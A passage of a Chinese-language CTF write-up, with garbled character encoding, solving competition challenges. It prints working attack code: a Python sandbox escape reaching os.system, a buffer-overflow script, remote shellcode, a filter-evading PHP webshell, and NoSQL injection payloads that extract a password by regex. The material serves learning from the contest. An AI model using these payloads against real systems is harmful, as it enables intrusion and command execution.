    <span class="n">sandbox</span> <span class="o">=</span> <span class="n">Sandbox</span><span class="p">()</span>
    <span class="n">banner</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'Python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">version</span><span class="si">}</span><span class="s"> on </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">platform</span><span class="si">}</span><span class="se">\n</span><span class="s">Supported Function: </span><span class="si">{</span><span class="s">", "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">WHITE_LIST</span><span class="p">)</span><span class="si">}</span><span class="s">'</span>
    <span class="n">sandbox</span><span class="p">.</span><span class="n">interact</span><span class="p">(</span><span class="n">banner</span><span class="o">=</span><span class="n">banner</span><span class="p">)</span>

</code></pre></div></div>

<p>åŸºæœ¬ä¸Šå®ƒæœƒçµ¦ä½ ä¸€å€‹python eval shellï¼Œä½†æ˜¯æœ‰å¹¾å€‹filter:</p>

<ol>
  <li>ç”¨ASTå»parseä½ çµ¦çš„æŒ‡ä»¤ï¼Œç„¶å¾Œrecursive traverseï¼Œå¦‚æœå‡ºç¾ä¸åœ¨ç™½åå–®è£¡çš„functionå°±æŠŠä½ æ“‹æ‰</li>
  <li>æ•´å€‹æŒ‡ä»¤ä¸å‡†å‡ºç¾<code class="language-plaintext highlighter-rouge">eval</code>, <code class="language-plaintext highlighter-rouge">exec</code>, <code class="language-plaintext highlighter-rouge">__import__</code></li>
</ol>

<p>ç¬¬ä¸€å€‹filteråœ¨ä»”ç´°å°ç…§æ–‡ä»¶ä¹‹å¾Œå¯ä»¥çœ‹åˆ°æœ‰å•é¡Œçš„ä¸€è¡Œ:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elif isinstance(node, ast.Slice):
            return traverse(node.lower) and traverse(node.upper)
------
Slice(expr? lower, expr? upper, expr? step)
</code></pre></div></div>

<p>Slice (list çš„ index) çš„éƒ¨ä»½å®ƒå°‘æª¢æŸ¥åˆ°step, ä¹Ÿå°±æ˜¯python iterableè£¡é ­å°‘è¦‹çš„ç¬¬ä¸‰é …ï¼Œå¯«æ³•åƒæ˜¯é€™æ¨£: <code class="language-plaintext highlighter-rouge">"abcdefg"[::2] -&gt; 'aceg'</code>ã€‚ç¸½ä¹‹æˆ‘å€‘å¯ä»¥æ¸¬è©¦é€™å€‹æ±è¥¿æœ‰æ²’æœ‰è¾¦æ³•æ‹¿ä¾†ç”¨ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; [1][::print(open('/etc/passwd').read())]
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
(ç•¥)
</code></pre></div></div>

<p>ç„¶å¾Œç™¼ç¾å¯ä»¥ï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†æˆ‘å€‘å¯ä»¥é€éä¸€èˆ¬ç¹éé—œéµå­—çš„æ–¹æ³•ä¾†æƒ³è¾¦æ³•æˆ³å‡ºflag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[1][::print(list(enumerate(''.__class__.__mro__[-1].__subclasses__())))]
[1,2,3][1:2:print(''.__class__.__mro__[-1].__subclasses__()[138])] --&gt; &lt;class 'os._wrap_close'&gt;
[1,2,3][1:2:print(''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['system']('cat /home/ctf/*'))]
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{1s_thi5_k1nd_0f_sp0t_th3_d1ff3renc3_g4me?}</code></p>

<p>References: https://www.gushiciku.cn/pl/2F7p/zh-tw</p>

<hr />
<h2 id="pwn">Pwn</h2>

<h3 id="bof2win">BOF2WIN</h3>

<p>åŸºæœ¬çš„Binary overflowé¡Œã€‚</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals1.ais3.org'</span><span class="p">,</span> <span class="mi">12347</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What's your name?"</span><span class="p">)</span>
<span class="n">target_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401216</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">target_addr</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{Re@1_B0F_m4st3r!!}</code></p>

<h3 id="give-me-sc">Give Me SC</h3>

<p>é¡Œç›®æ­£å¦‚å­—é¢ä¸Šçš„æ„æ€ä¸€æ¨£ï¼Œä½ çµ¦å®ƒä¸€äº›å­—å…ƒï¼Œå®ƒå°±æœƒæŠŠå®ƒç•¶functionåŸ·è¡Œã€‚æˆ‘çš„shell codeæ˜¯å¾é€™è£¡å·éä¾†ã„‰ï¼šhttps://www.exploit-db.com/exploits/47048</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4</span><span class="s">"</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chals1.ais3.org"</span><span class="p">,</span><span class="mi">15566</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"aaa"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"shellcode"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Flag æ”¾åœ¨ /home/give_me_sc/flag : <code class="language-plaintext highlighter-rouge">AIS3{Y0uR_f1rst_Aarch64_Shellcoding}</code></p>

<hr />
<h2 id="reverse">Reverse</h2>

<h3 id="time-management">Time Management</h3>

<p>é€™é¡Œä¹Ÿæ˜¯æ„å¤–æ¶åˆ°é¦–æ®º:) ç›´æ¥ä¸ŠGhidra:</p>

<p><img src="/assets/img/2022-06-07/image-20220520152753594.png" alt="image-20220520152753594" /></p>

<p>éå¸¸çš„ç›´ç™½ï¼Œå®ƒæœƒåšä¸€äº›å¥‡æ€ªçš„åŠ å¯†è§£å¯†xorçš„æ±è¥¿ï¼Œç„¶å¾Œæ¯éš”éå¸¸ä¹…çš„ä¸€æ®µæ™‚é–“æ‰å°å‡ºä¸€å€‹å­—å…ƒã€‚è§£æ³•å¾ˆå¤šï¼Œæˆ‘é€™è£¡æ˜¯ç›´æ¥æŠŠç­‰å¾…æ™‚é–“patchæˆ0ï¼Œç„¶å¾Œæ”¹æ‰æœ€å¾Œçš„<code class="language-plaintext highlighter-rouge">\r</code> å…å¾—å®ƒæŠŠæˆ‘å€‘çš„flagçµ¦æ´—æ‰ã€‚ç„¶å¾Œflagå°±å‡ºä¾†æ‹‰</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{You_are_the_master_of_time_management!!!!!}</code></p>

<h3 id="strings">Strings</h3>

<p>é€™é¡Œæ˜¯ç”¨rustå¯«çš„ï¼Œç„¶å¾Œæˆ‘ä¸æœƒå¯«rustã€‚ä½†ç„¡è«–å¦‚ä½•ï¼Œè©²reverseçš„é‚„æ˜¯å¾—reverseã€‚ä¸ŠGhidra:</p>

<p>Main è£¡é ­åªæœƒcallå¦ä¸€å€‹åœ¨namespaceè£¡é ­çš„main, ä¸çŸ¥é“ç‚ºä»€éº¼:</p>

<p><img src="/assets/img/2022-06-07/image-20220520153630441.png" alt="image-20220520153630441" /></p>

<p>å°é€™å€‹mainå»æŠŠdecompileçš„æ±è¥¿æ•´ç†æª¢æŸ¥ä¸€ä¸‹ï¼Œå¾ˆå¤šåœ°æ–¹é‚„æ˜¯ç„¡æ³•é–±è®€ï¼Œä¸éé‡è¦çš„æ˜¯é€™ä¸€æ®µ: (æ¸…ç†éå¾Œ)</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">core</span><span class="o">::</span><span class="n">str</span><span class="o">::&lt;</span><span class="n">impl_str</span><span class="o">&gt;::</span><span class="n">split</span><span class="p">(</span><span class="n">local_190</span><span class="p">,</span><span class="n">SUB168</span><span class="p">(</span><span class="n">auVar3</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="n">SUB168</span><span class="p">(</span><span class="n">auVar3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x40</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="s">"_"</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="n">i</span> <span class="o">=</span> <span class="n">alloc</span><span class="o">::</span><span class="n">vec</span><span class="o">::</span><span class="n">Vec</span><span class="o">&lt;</span><span class="n">T</span><span class="p">,</span><span class="n">A</span><span class="o">&gt;::</span><span class="n">len</span><span class="p">(</span><span class="n">our_input</span><span class="p">);</span>
  <span class="n">auVar3</span> <span class="o">=</span> <span class="n">CONCAT88</span><span class="p">(</span><span class="n">j</span><span class="p">.</span><span class="n">_8_8_</span><span class="p">,</span><span class="n">j</span><span class="p">.</span><span class="n">_0_8_</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mh">0xb</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_108</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">local_100</span> <span class="o">=</span> <span class="mh">0xb</span><span class="p">;</span>
    <span class="n">local_f8</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">I_as_core</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">traits</span><span class="o">::</span><span class="n">collect</span><span class="o">::</span><span class="n">IntoIterator</span><span class="o">&gt;::</span><span class="n">into_iter</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xb</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
      <span class="n">auVar3</span> <span class="o">=</span> <span class="n">core</span><span class="o">::</span><span class="n">ops</span><span class="o">::</span><span class="n">range</span><span class="o">::</span><span class="n">Range</span><span class="o">&lt;</span><span class="n">A</span><span class="o">&gt;&gt;::</span><span class="n">next</span><span class="p">(</span><span class="n">local_f8</span><span class="p">);</span>
      <span class="n">i</span> <span class="o">=</span> <span class="n">SUB168</span><span class="p">(</span><span class="n">auVar3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x40</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">SUB168</span><span class="p">(</span><span class="n">auVar3</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
      <span class="n">j</span> <span class="o">=</span> <span class="n">auVar3</span><span class="p">;</span>
      <span class="n">input_char</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">alloc</span><span class="o">::</span><span class="n">vec</span><span class="o">::</span><span class="n">Vec</span><span class="o">&lt;</span><span class="n">T</span><span class="p">,</span><span class="n">A</span><span class="o">&gt;</span><span class="n">as_core</span><span class="o">::</span><span class="n">ops</span><span class="o">::</span><span class="n">index</span><span class="o">::</span><span class="n">Index</span><span class="o">&lt;</span><span class="n">I</span><span class="o">&gt;&gt;::</span><span class="n">index</span>
                             <span class="p">(</span><span class="n">our_input</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="o">&amp;</span><span class="n">PTR_s_strings</span><span class="p">.</span><span class="n">rs__00155d58</span><span class="p">);</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">DWORD_ARRAY_001451d0</span><span class="p">,</span><span class="mh">0x58</span><span class="p">);</span>
      <span class="n">uVar1</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
      
      <span class="n">bVar2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">A</span><span class="o">&gt;::</span><span class="n">ne</span><span class="p">(</span><span class="n">input_char</span><span class="p">,</span><span class="n">ais3_str</span> <span class="o">+</span> <span class="n">uVar1</span> <span class="o">*</span> <span class="mi">2</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">bVar2</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">correct_flag</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>é€™è£¡çš„é‡é»æ˜¯dataã€input_charã€ais3_stré€™å¹¾å€‹æ±è¥¿ã€‚é¦–å…ˆï¼Œdataæœƒå­˜ä¸€å€‹ 58 bytes çš„arrayï¼Œæˆ‘é€™è£¡æ˜¯ççŒœä»–æ˜¯dword arrayã€‚åœ¨loopçš„æ™‚å€™æ¯å›åˆæœƒæª¢æŸ¥<code class="language-plaintext highlighter-rouge">input_char == ais3_str[2*data[i]]</code>ï¼Œå¦‚æœä¸ç¬¦åˆå°±æœƒå¤±æ•—ã€‚æ¥ä¸‹ä¾†çœ‹ais3_strå­˜äº†äº›ä»€éº¼ï¼š</p>

<p><img src="/assets/img/2022-06-07/image-20220520155250117.png" alt="image-20220520155250117" /></p>

<p><img src="/assets/img/2022-06-07/image-20220520155559727.png" alt="image-20220520155559727" /></p>

<p>æˆ‘ç›´åˆ°ä½œåˆ°é€™è£¡æ‰ç™¼ç¾ais3_strå…¶å¯¦ä¸æ˜¯stringï¼Œè€Œæ˜¯string arrayã€‚é€™è£¡æ‰€æœ‰çš„stringä¸²èµ·ä¾†æœƒå¾—åˆ°ä¸€å€‹å‡flagï¼Œç”¨ä¾†å—†æƒ³è¦ç›´æ¥<code class="language-plaintext highlighter-rouge">strings</code>äº¤å·®çš„äººï¼Œä½†çœ‹ä¾†äº‹å¯¦ä¸ŠçœŸçš„flagå…¶å¯¦ä¹Ÿè—åœ¨é€™è£¡ã€‚é‚£éº¼ï¼Œæˆ‘å€‘å°±æŒ‰ç…§<code class="language-plaintext highlighter-rouge">DWORD_ARRAY_001451d0</code>è£¡é¢çš„indexï¼Œä¾†æŠŠflagä¸²èµ·ä¾†çœ‹çœ‹ï¼Œç„¶å¾Œåœ¨æ¯å€‹å­—ä¸²ä¸­é–“åŠ <code class="language-plaintext highlighter-rouge">_</code>ï¼š</p>

<p><img src="/assets/img/2022-06-07/image-20220520160020665.png" alt="image-20220520160020665" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{_the_answer_is_guess_the_strings_using_good_luck_}</code></p>

<h3 id="æ®¼">æ®¼</h3>

<p>é€™é¡Œçµ¦äº†ä½ ä¸€äº›ç”¨ã€Œ<a href="https://github.com/wenyan-lang/wenyan">æ–‡è¨€</a>ã€å¯«çš„ç¨‹å¼ï¼Œç„¶å¾Œè¦æ±‚ä½ reverseã€‚æŒ‰ç…§æ–‡ä»¶è¦æ±‚ç”¨npmå®‰è£ä¹‹å¾Œï¼Œå°±å¯ä»¥æŠŠå®ƒç·¨è­¯æˆjsã€‚åŸ·è¡Œä¹‹å¾Œæœƒå¾—åˆ°ä¸€å€‹é¡ä¼¼shellçš„ç•Œé¢ï¼š</p>

<p><img src="/assets/img/2022-06-07/image-20220520161516682.png" alt="image-20220520161516682" /></p>

<p>å¤ªå¤šå¹«åŠ©äº†å§ï¼Ÿå°jsç¨å¾®çœ‹ä¸€ä¸‹å¯ä»¥ç™¼ç¾é€™å€‹shellçš„ä¸»è¦åŠŸèƒ½ï¼Œé–‹é ­è¦æ˜¯ã€Œè›µç…¿ã€æ‰æœƒæœ‰å‹•ä½œï¼š</p>

<p><img src="/assets/img/2022-06-07/image-20220520161706098.png" alt="image-20220520161706098" /></p>

<p>é›–ç„¶åœ¨é€™å€‹ä¹‹å¾Œæˆ‘æœ‰è©¦åœ–ç¹¼çºŒreverseé€™å€‹jsï¼Œä½†ä¸€ä¸‹è‹±æ–‡ä¸€ä¸‹ä¸­æ–‡çš„å¯¦åœ¨æ˜¯å¤ªç´¯äº†ã€‚ä¸éï¼Œå°é€™å€‹shellå†ç©ä¸€ä¸‹å¯ä»¥ç™¼ç¾é€™å€‹ï¼š</p>

<p><img src="/assets/img/2022-06-07/image-20220520162056149.png" alt="image-20220520162056149" /></p>

<p>å¯ä»¥çœ‹å‡ºæ¯ä¸‰å€‹å­—å…ƒæœƒå°æ‡‰åˆ°å…©çµ„æ•¸å­—å’Œä¸­æ–‡å­—ï¼Œè·Ÿbase64å¾ˆåƒã€‚æ—¢ç„¶\(95^3=857375\)ä¹Ÿä¸ç®—æ˜¯å¤ªå¯æ€•çš„æ•¸å­—ï¼Œé‚£éº¼æ¥ä¸‹ä¾†å°±æ˜¯å¿«æ¨‚çš„brute forceæ™‚é–“ã„Œï¼š</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding: utf-8 -*-
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">ls</span> <span class="o">=</span> <span class="s">"/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA_\{\}-"</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="s">"è›µç…¿ "</span>
<span class="n">dct</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'wenyan æ®¼.wy'</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">c1</span> <span class="ow">in</span> <span class="n">ls</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">c1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">c2</span> <span class="ow">in</span> <span class="n">ls</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">c3</span> <span class="ow">in</span> <span class="n">ls</span><span class="p">:</span>
            <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="c1"># if count &gt;= 10: break
</span>            <span class="n">seq</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">c1</span><span class="si">}{</span><span class="n">c2</span><span class="si">}{</span><span class="n">c3</span><span class="si">}</span><span class="s">"</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">prefix</span><span class="o">+</span><span class="n">seq</span><span class="p">)</span>
            <span class="n">res</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
            <span class="n">clean</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span><span class="o">+</span><span class="n">res</span><span class="p">[</span><span class="o">-</span><span class="mi">12</span><span class="p">:</span><span class="o">-</span><span class="mi">7</span><span class="p">]</span>
            
            <span class="n">dct</span><span class="p">[</span><span class="n">clean</span><span class="p">]</span> <span class="o">=</span> <span class="n">seq</span>
<span class="c1"># print(dct)
</span>
<span class="n">target</span> <span class="o">=</span> <span class="p">[</span><span class="s">"181mç202mç•¶"</span><span class="p">,</span><span class="s">"177mä¹‹210må…‡"</span><span class="p">,</span><span class="s">"191mæ·±170må®š"</span><span class="p">,</span><span class="s">"189må¿ 197må¿ "</span><span class="p">,</span><span class="s">"192mè¤‡226mé™¤"</span><span class="p">,</span><span class="s">"177mç‡226mæœˆ"</span><span class="p">,</span><span class="s">"191mæœˆ170méƒ½"</span><span class="p">,</span><span class="s">"177mä¸‰178mé‚„"</span><span class="p">,</span><span class="s">"177mä¸‰209må…ˆ"</span><span class="p">,</span><span class="s">"188mè€Œ197må¿ "</span><span class="p">,</span><span class="s">"192må…‡198mæ•…"</span><span class="p">,</span><span class="s">"192mè¤‡226må·³"</span><span class="p">,</span><span class="s">"177mä¸‰222må®š"</span><span class="p">,</span><span class="s">"189mç‡225mé™›"</span><span class="p">,</span><span class="s">"194mè»166mé™¤"</span><span class="p">,</span><span class="s">"178mè»186må¿ "</span><span class="p">,</span><span class="s">"181mç‡226mæ‰€"</span><span class="p">,</span><span class="s">"177mç€˜226mç"</span><span class="p">,</span><span class="s">"181mç218mé™¤"</span><span class="p">,</span><span class="s">"179mç•¶166méˆ"</span><span class="p">,</span><span class="s">"178mä¸‰170mæ–Ÿ"</span><span class="p">]</span>

<span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">dct</span><span class="p">[</span><span class="n">s</span><span class="p">],</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"could not find "</span><span class="o">+</span><span class="n">s</span><span class="p">)</span>

</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{chaNcH4n_a1_Ch1k1ch1k1_84n8An_M1nNa_5upa5utA_n0_TAMa90_5a}</code></p>

<h3 id="calculator">Calculator</h3>

<p>.NET, ILSpyé–‹èµ·ä¾†ï¼ŒæŠŠæ¯å€‹æª”æ¡ˆä¸Ÿé€²å»å¯ä»¥çœ‹åˆ°ä¸€äº›éæ¿¾æ¢ä»¶ï¼Œç…§ä»–çš„æ¢ä»¶ç©ä¸€ä¸‹å¡«å­—éŠæˆ²å°±å¥½äº†ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0123456789012345678901234567890123456789012345
AIS3{          A                             }
    {D                                    G_G}
     D0T_N3T_FRAm3W0rk                  __   
                     k 15_S0_C0mPlicaT3d
AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}
</code></pre></div></div>
<hr />

<h2 id="web">Web</h2>

<h3 id="simple-file-uploader">Simple File Uploader</h3>

<p>å…©å€‹ä¸Šå‚³filter:</p>

<ol>
  <li>å‰¯æª”åä¸å‡†æ˜¯<code class="language-plaintext highlighter-rouge">'php', 'php2', 'php3', 'php4', 'php5', 'php6', 'phtml', 'pht'</code></li>
  <li>æª”æ¡ˆå…§å®¹ä¸å‡†æœ‰<code class="language-plaintext highlighter-rouge">system, exec, passthru, show_source, proc_open, popen, pcntl_exec, eval, assert, die, shell_exec, create_function, call _user_func, preg_replace</code></li>
</ol>

<p>ç¹éçš„æ–¹æ³•ä¹Ÿç°¡å–®:</p>

<ol>
  <li>å‰¯æª”åç”¨<code class="language-plaintext highlighter-rouge">pHp</code>ï¼Œé€™æ¨£php serveré‚„æ˜¯æœƒparse</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;?php (sy.(st).em)($_GET['cmd']);</code></li>
</ol>

<p>æ–¼æ˜¯å°±æœ‰äº†webshell, åŸ·è¡Œ<code class="language-plaintext highlighter-rouge">/rUn_M3_t0_9et_fL4g</code>å¾—åˆ°flag: <code class="language-plaintext highlighter-rouge">FLAG:  AIS3{H3yyyyyyyy_U_g0t_miÙ©(ËŠá—œË‹*)Ùˆ}</code></p>

<h3 id="poking-bear">Poking Bear</h3>

<p>é€²å»ç¶²é å¯ä»¥çœ‹åˆ°æ¯å€‹æŒ‰éˆ•çš„urléƒ½æ˜¯<code class="language-plaintext highlighter-rouge">chals1.ais3.org:8987/bear/[number]</code>ï¼Œä¸¦ä¸”æŒ‰ç…§æ•¸å­—å¤§å°æ’åˆ—ï¼Œä½†æ˜¯ç›®æ¨™çš„Secret bearå»æ²’æœ‰æ•¸å­—ã€‚æ–¼æ˜¯æˆ‘å€‘å¯ä»¥é–‹Burpï¼Œå¾<code class="language-plaintext highlighter-rouge">bear/350</code>æš´åŠ›ä¸€è·¯æˆ³åˆ°<code class="language-plaintext highlighter-rouge">bear/777</code>ï¼Œå°±å¯ä»¥æ‰¾åˆ°Secret bear åœ¨ <code class="language-plaintext highlighter-rouge">bear/499</code>ã€‚</p>

<p>é€²å»ä¹‹å¾Œé»Pokeçš„è©±ï¼Œå®ƒæœƒèªªâ€You canâ€™t poke SECRET BEAR since you are not â€œbear pokerâ€!â€ã€‚å› æ­¤å›åˆ°Burpï¼Œç„¶å¾ŒæŠŠä»–çš„cookie æ”¹æˆ â€œsecret bearâ€å†æˆ³ä¸€æ¬¡å°±æœ‰flagäº†ã€‚</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">AIS3{y0u_P0l&lt;3_7h3_Bear_H@rdLy&gt;&lt;}</code></p>

<h3 id="the-best-login-ui">The Best Login UI</h3>

<p>ä¸€é€²å»é¡Œç›®çœ‹åˆ°ä¸€å€‹ç›¸ç•¶å¯¦ç”¨çš„ç™»å…¥ç•Œé¢ï¼Œçœ‹åˆ°é€™éº¼å¤šé…·é…·çš„ç‰¹æ®Šå­—å…ƒï¼Œæƒ³å¿…é€™çµ•å°ä¸æœƒæ˜¯SQLIå§ï¼ŸéŒ¯äº†ï¼Œæª”æ¡ˆè£¡é¢æœ‰mongoDBçš„æ±è¥¿ï¼Œé€™æ˜¯NoSQLã€‚é‚£ç¸½ä¹‹å°±å…ˆä¾†è©¦è©¦çœ‹ä¸€äº›åŸºæœ¬çš„æ±è¥¿ç¢ºå®šæ˜¯ä¸æ˜¯NoSQL:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[$ne]=aaa&amp;password[$ne]=meowmeow  -&gt; success
</code></pre></div></div>

<p>é‚„çœŸçš„æ˜¯NoSQLã€‚é‚£éº¼æ¥ä¸‹ä¾†è©¦å¯†ç¢¼é•·åº¦ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[$ne]=toto&amp;password[$regex]=.{41} -&gt; success
username[$ne]=toto&amp;password[$regex]=.{42} -&gt; fail
</code></pre></div></div>

<p>å¯†ç¢¼é•·åº¦41å€‹å­—å…ƒï¼Œæ¥ä¸‹ä¾†å°±æ˜¯æ‰¾å¯†ç¢¼äº†ï¼Œé€™è£¡æˆ‘å€‘åªèƒ½ä¸€å€‹å­—å…ƒä¸€å€‹å­—å…ƒè©¦ï¼Œå¯ä»¥ç”¨BurpåŠ é€Ÿé€™å€‹éç¨‹ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[$ne]=toto&amp;password[$regex]=A.{40} -&gt; success
username[$ne]=toto&amp;password[$regex]=B.{40} -&gt; fail
username[$ne]=toto&amp;password[$regex]=AI.{39} -&gt; success
username[$ne]=toto&amp;password[$regex]=AIS.{38} -&gt; success
</code></pre></div></div>

<p>Burpçš„IntruderåŠŸèƒ½å¾ˆå¥½ç”¨ï¼Œä½†æ˜¯é‡åˆ°å¤ªå¥‡æ€ªçš„å­—å…ƒæœ‰æ™‚å€™ä¹Ÿæœƒçˆ›æ‰ï¼Œé€™æ™‚å€™å¾—è¦ç”¨æ‰‹å‹•Regexä¾†æbinary searchâ€¦</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Regex: [\x00-\x7f] matches all ascii characters
</code></pre></div></div>

<p>æ­·ç¶“åƒè¾›è¬è‹¦å¾Œæˆ‘å€‘å¯ä»¥å¾—åˆ°flag: <code class="language-plaintext highlighter-rouge">AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}</code></p>

<p>References: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</p>

<h3 id="taritari">TariTari</h3>

